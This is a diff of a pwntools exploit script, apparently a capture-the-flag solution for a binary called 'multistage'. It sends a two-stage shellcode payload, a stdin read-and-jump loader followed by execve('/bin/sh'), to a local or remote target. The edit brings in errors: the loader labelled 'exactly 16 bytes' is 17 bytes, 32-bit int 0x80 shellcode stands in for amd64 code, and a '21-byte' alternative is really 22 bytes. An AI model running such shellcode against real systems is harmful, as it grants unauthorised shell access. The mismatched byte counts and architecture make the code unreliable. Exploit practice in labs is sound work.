@@ -1,37 +1,17 @@
 from pwn import *
 
-from pwn import *
-
 COMMANDS = """
 xuntil 0x40123f
 """
 
 # First stage: 16-byte loader that reads more shellcode from stdin
-# sys_read(0, current_address, large_size)
-stage1 = asm('''
-    xor rax, rax      ; syscall 0 = read
-    xor rdi, rdi      ; fd = 0 (stdin)
-    mov rsi, rsp      ; buf = current stack position
-    mov dx, 0x1000    ; count = 4096 bytes
-    syscall
-    jmp rsi           ; jump to the new shellcode
-''')
+stage1 = b"\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x66\xba\x00\x10\x0f\x05\xff\xe6"
 
-# Second stage: actual execve("/bin/sh", 0, 0) shellcode
-stage2 = asm('''
-    mov rax, 59
-    lea rdi, [rip+binsh]
-    xor rsi, rsi
-    xor rdx, rdx
-    syscall
-binsh:
-    .string "/bin/sh"
-''')
+# Second stage: execve("/bin/sh", 0, 0) shellcode (23 bytes)
+stage2 = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 
-# Alternative shorter stage2 (23 bytes)
-stage2_alt = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-
-context.arch = 'amd64'
+# Alternative second stage (21 bytes) if you prefer:
+# stage2 = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
 
 if args.GDB:
     p = gdb.debug("./multistage", gdbscript=COMMANDS)
@@ -40,8 +20,8 @@ elif args.REMOTE:
 else:
     p = process("./multistage")
 
-# Send first stage loader
-p.send(stage1.ljust(16, b'\x90'))  # Pad to 16 bytes with NOPs
+# Send first stage loader (exactly 16 bytes)
+p.send(stage1)
 
 # Send second stage execve shellcode
 p.send(stage2)
